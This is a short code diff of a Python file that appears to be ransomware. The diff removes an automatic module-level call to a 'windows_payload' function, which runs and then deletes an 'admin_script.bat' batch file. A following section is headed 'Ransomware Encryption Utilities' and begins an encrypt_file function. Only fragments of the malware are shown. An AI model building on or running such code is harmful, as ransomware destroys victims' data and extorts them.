@@ -11,9 +11,6 @@ import requests
 import os
 import threading
 
-
-
-
 def windows_payload():
     try:
         subprocess.run(
@@ -25,8 +22,6 @@ def windows_payload():
         print(f"Error executing batch file: {e}")
 
     os.remove("./admin_script.bat")
-
-windows_payload()
 
 # Ransomware Encryption Utilities
 def encrypt_file(file_path, out_file_path, key):
